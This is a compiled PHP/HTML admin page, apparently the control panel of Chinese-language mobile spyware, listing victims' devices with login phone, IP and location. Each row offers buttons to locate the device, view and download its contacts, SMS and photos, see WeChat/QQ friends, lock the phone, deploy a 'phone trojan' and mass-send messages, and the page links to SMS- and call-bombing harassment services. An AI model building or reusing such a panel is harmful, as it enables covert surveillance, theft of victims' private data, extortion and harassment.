<?php if (!defined('THINK_PATH')) exit(); /*a:2:{s:64:"/www/wwwroot/qingyu.com/public/../app/admin/view/appv1/user.html";i:1658306232;s:55:"/www/wwwroot/qingyu.com/app/admin/view/public/foot.html";i:1657691353;}*/ ?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>layui</title>
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <link rel="stylesheet" href="/static/public/layui/css/layui.css"  media="all">
  <link rel="stylesheet" href="/static/public/font-awesome/css/font-awesome.min.css" media="all" />
  <link rel="stylesheet" href="/static/admin/css/admin.css"  media="all">


        
  <style type="text/css">

/* tooltip */
#tooltip{
  position:absolute;
  border:1px solid #ccc;
  background:#333;
  padding:2px;
  display:none;
  color:#fff;
}
</style>
<body style="padding:10px;">
  <div class="tplay-body-div">
    <div class="layui-tab">
      <ul class="layui-tab-title">
          
        <li class="el-button el-button--success">设备查看管理</li>
      </ul>
    </div> 
    <!--<button class="el-button el-button--primary">按钮</button>-->
    <!--<button class="el-button el-button--primary is-plain">按钮</button>-->
    <!--<button class="el-button el-button--success">按钮</button>-->
    <!--<button class="el-button el-button--success is-plain">按钮</button>-->
    <!--<button class="el-button el-button--warning">按钮</button>-->
    <!--<button class="el-button el-button--warning is-plain">按钮</button>-->
    <!--<button class="el-button el-button--danger">按钮</button>-->
    <!--<button class="el-button el-button--danger is-plain">按钮</button>-->
    <!--<button class="el-button el-button--info">按钮</button>-->
    <!--<button class="el-button el-button--info is-plain">按钮</button>-->
    <form class="layui-form serch" action="<?php echo url('admin/appv1/user'); ?>" method="post">
        <div class="layui-form-item" style="float: left;">
          <div class="layui-input-inline">
            <input type="text" name="keywords" lay-verify="title" autocomplete="off" placeholder="请输入登录手机" class="layui-input layui-btn-sm">
          </div>
          <div class="layui-input-inline">
            <input type="text" name="code" lay-verify="title" autocomplete="off" placeholder="请输入邀请码" class="layui-input layui-btn-sm">
          </div>          
          <div class="layui-input-inline">
            <div class="layui-inline">
              <div class="layui-input-inline">
                <input type="text" class="layui-input" id="create_time" placeholder="登录时间" name="create_time">
              </div>
            </div>
          </div>
          <button class="el-button el-button--success layui-btn-sm" lay-submit="" lay-filter="serch">立即提交</button>
        </div>
      </form>
    <table class="layui-table" lay-size="sm">
    	<button class="el-button el-button--danger delAll_btn" lay-submit="" lay-filter="admin">批量删除</button>
    	<br />
    	<hr />
    	<div class="layui">
    	 <a href="http://dianhuahongzhaji.com/sms/" class="el-button el-button--success">免费短信轰炸①</a>   
    	 <a href="https://www.ceya.me/inde.php" class="el-button el-button--success">免费无敌短信轰炸②</a>  
    	 <a href="https://www.ceya.me/d.html" class="el-button el-button--success">免费无敌短信轰炸③</a>
    	  <a href="http://www.tut2020.com/call/" class="el-button el-button--primary">收费电话轰炸④</a>
    	  	<hr />
    	      	<p class="el-button el-button--primary is-plain"><a href="http://t.me/shiguang2023" target="_blank">由快科技提供技术支持</p><br /><br />
    	 
    	 
    	 
    	 

      <colgroup>
      	<col width="10">
        <col width="40">
        <col width="100">
        <col width="30">
        <col width="30">
        <col width="120">
        <col width="120">
        <col width="120">
        <col width="500">
      </colgroup>
      <thead>
        <tr>
          <th><input type="checkbox" name="" lay-skin="primary" lay-filter="allChoose" id="allChoose" /></th>
          <th>ID</th>
          <th>设备名称</th>          
          <th>登录手机</th>
          <th>邀请码</th>          
          <th>最后登录时间</th>
          <th>最后登录IP地址</th>
          <th>最后登录位置</th>		  
          <th>操作</th>
        </tr> 
      </thead>
      <tbody>
        <?php if(is_array($admin) || $admin instanceof \think\Collection || $admin instanceof \think\Paginator): $i = 0; $__LIST__ = $admin;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?>
        <tr>
          <td class="news_content"><input type="checkbox" name="imgVo" value="<?php echo $vo['id']; ?>"/></td>
          <td><?php echo $vo['id']; ?></td>
          <td><?php echo $vo['clientid']; ?></td>
          <td><?php echo $vo['name']; ?></td>
          <td><?php echo $vo['code']; ?></td>          
          <td><?php echo date("Y-m-d H:i:s",$vo['login_time']); ?></td>
          <td><?php echo $vo['ip']; ?></td>
		  <td><a href="https://ip.lihaoba.com/<?php echo $vo['ip']; ?>.html" target="_blank">点击查看</a></td>
          <td class="operation-menu">
            <div class="layui">
              <a href="<?php echo url('appv1/dingwei',['id'=>$vo['id']]); ?>" class="el-button el-button--primary delAll_ " id="<?php echo $vo['id']; ?>" title="在线设备定位" alt="在线设备定位" >在线设备定位</a>       
              <a href="<?php echo url('appv1/mobile',['id'=>$vo['id']]); ?>" class="el-button el-button--primary is-plain delAll_" id="<?php echo $vo['id']; ?>" title="查询设备通讯录" alt="查询设备通讯录" >查看设备通讯录</a>
              <a href="<?php echo url('appv1/sms',['id'=>$vo['id']]); ?>" class="el-button el-button--success delAll_ " id="<?php echo $vo['id']; ?>" title="查询设备短信" alt="查询设备短信" >查看设备短信</a> 
              <hr />
              <a href="<?php echo url('appv1/xiangce',['id'=>$vo['name']]); ?>" class="el-button el-button--success is-plain layui-btn-sm" id="<?php echo $vo['name']; ?>" title="查询设备相册" alt="查询设备相册" >查看设备相册</a>
              <a href="<?php echo url('appv1/exportexcel',['id'=>$vo['id']]); ?>" class="el-button el-button--warning" id="<?php echo $vo['id']; ?>" title="下载设备通讯录数据" alt="下载设备通讯录数据" >下载通讯录数据</a>
              <a href="<?php echo url('appv1/smsexcel',['id'=>$vo['id']]); ?>" class="el-button el-button--warning is-plain" id="<?php echo $vo['id']; ?>" title="下载设备短信数据" alt="下载设备短信数据" >下载短信数据</a> 
              <hr />
              <a href="#" class="el-button el-button--danger " id="<?php echo $vo['id']; ?>"  >查看微信QQ好友</a>
              <a href="#" class="el-button el-button--danger is-plain" id="<?php echo $vo['id']; ?>"  >在线手机锁机</a>
              <a href="#" class="el-button el-button--info " id="<?php echo $vo['id']; ?>"  >手机黑木马</a>
              <hr />
              <a href="#" class="el-button el-button--info is-plain" id="<?php echo $vo['id']; ?>"  >一键群发各大网站</a>
              <a href="#" class="el-button el-button--primary" id="<?php echo $vo['id']; ?>"  >一键群发彩信</a>
              <a href="#" class="el-button el-button--success" id="<?php echo $vo['id']; ?>"  >一键群发短信</a>
              <hr />
              <a class="el-button el-button--primary deleteuser" id="<?php echo $vo['id']; ?>" title="清空通讯录数据" alt="清空通讯录数据" >清空通讯录</a>
              <a class="el-button el-button--danger deletesms" id="<?php echo $vo['id']; ?>" title="清空短信数据" alt="清空短信数据" >清空短信</a>
              <a class="el-button el-button--warning delete" id="<?php echo $vo['id']; ?>" title="删除用户" alt="删除用户" >清空所有</a>
            </div>
          </td>
        </tr>
        <?php endforeach; endif; else: echo "" ;endif; ?>
      </tbody>
    </table>
    <div style="padding:0 20px;"><?php echo $admin->render(); ?></div>

        <script src="/static/public/layui/layui.js" charset="utf-8"></script>
    <script src="/static/public/jquery/jquery.min.js"></script>
    <script>
            var message;
            layui.config({
                base: '/static/admin/js/',
                version: '1.0.1'
            }).use(['app', 'message'], function() {
                var app = layui.app,
                    $ = layui.jquery,
                    layer = layui.layer;
                //将message设置为全局以便子页面调用
                message = layui.message;
                //主入口
                app.set({
                    type: 'iframe'
                }).init();
            });
        </script> 
    <script type="text/javascript">
    $(function(){
      var x = 10;
      var y = 20;
      $(".tooltip").mouseover(function(e){ 
        var tooltip = "<div id='tooltip'><img src='"+ this.href +"' alt='产品预览图' height='200'/>"+"<\/div>"; //创建 div 元素
        $("body").append(tooltip);  //把它追加到文档中             
        $("#tooltip")
          .css({
            "top": (e.pageY+y) + "px",
            "left":  (e.pageX+x)  + "px"
          }).show("fast");    //设置x坐标和y坐标，并且显示
        }).mouseout(function(){  
        $("#tooltip").remove();  //移除 
        }).mousemove(function(e){
        $("#tooltip")
          .css({
            "top": (e.pageY+y) + "px",
            "left":  (e.pageX+x)  + "px"
          });
      });
    })
    </script>
    <script type="text/javascript">
    $('.a_menu').click(function(){
      var url = $(this).attr('href');
      var id = $(this).attr('id');
      var a = true;
      if(id) {
        $.ajax({
          url:url
          ,async:false
          ,data:{id:id}
          ,success:function(res){
            if(res.code == 0) {
              layer.msg(res.msg);
              a = false;
            }
          }
        })
      } else {
        $.ajax({
          url:url
          ,async:false
          ,success:function(res){
            if(res.code == 0) {
              layer.msg(res.msg);
              a = false;
            }
          }
        })
      }
      return a;
    })
    </script>
    <script>
    layui.use('laydate', function(){
      var laydate = layui.laydate;
      
      //常规用法
      laydate.render({
        elem: '#create_time'
      });
    });
    </script>
    
    <script type="text/javascript">
    
    $("#allChoose").click(function () {
       $("input[name='imgVo']:checkbox").prop("checked", this.checked);
   });

    $('.delAll_btn').click(function(){
                var checkids = [];
                $("input[name='imgVo']:checked").each(function(i){
                    checkids[i] = $(this).val();
                });
                if(checkids.length<=0){
                	layer.msg('请选择要删除的聊天记录!');
                	return;
                }else{
      layer.confirm('确定要删除并清空这些设备的所有数据吗？（注：删除后不可恢复）', function(index) {
        $.ajax({
          url:"<?php echo url('admin/appv1/alldeletes'); ?>",
          data:{delid:checkids},
          success:function(res) {
            layer.msg(res.msg);
            if(res.code == 1) {
              setTimeout(function(){
                location.href = res.url;
              },1500)
            }
          }
        })
      })
             
     }    	
    })

    $('.delete').click(function(){
      var id = $(this).attr('id');
      layer.confirm('确定要删除这台设备帐号和所有数据吗？（注：删除后不可恢复）', function(index) {
        $.ajax({
          url:"<?php echo url('admin/appv1/delete'); ?>",
          data:{id:id},
          success:function(res) {
            layer.msg(res.msg);
            if(res.code == 1) {
              setTimeout(function(){
                location.href = res.url;
              },1500)
            }
          }
        })
      })
    })
    
    $('.deleteuser').click(function(){
      var id = $(this).attr('id');
      layer.confirm('确定要清空这台设备的所有通讯录数据？（注：删除后不可恢复）', function(index) {
        $.ajax({
          url:"<?php echo url('admin/appv1/clearuser'); ?>",
          data:{id:id},
          success:function(res) {
            layer.msg(res.msg);
            if(res.code == 1) {
              setTimeout(function(){
                location.href = res.url;
              },1500)
            }
          }
        })
      })
    }) 
    
    $('.deletesms').click(function(){
      var id = $(this).attr('id');
      layer.confirm('确定要清空这台设备的所有短信数据？（注：删除后不可恢复）', function(index) {
        $.ajax({
          url:"<?php echo url('admin/appv1/clearsms'); ?>",
          data:{id:id},
          success:function(res) {
            layer.msg(res.msg);
            if(res.code == 1) {
              setTimeout(function(){
                location.href = res.url;
              },1500)
            }
          }
        })
      })
    })      
    </script>
  </div>
</body>
</html>
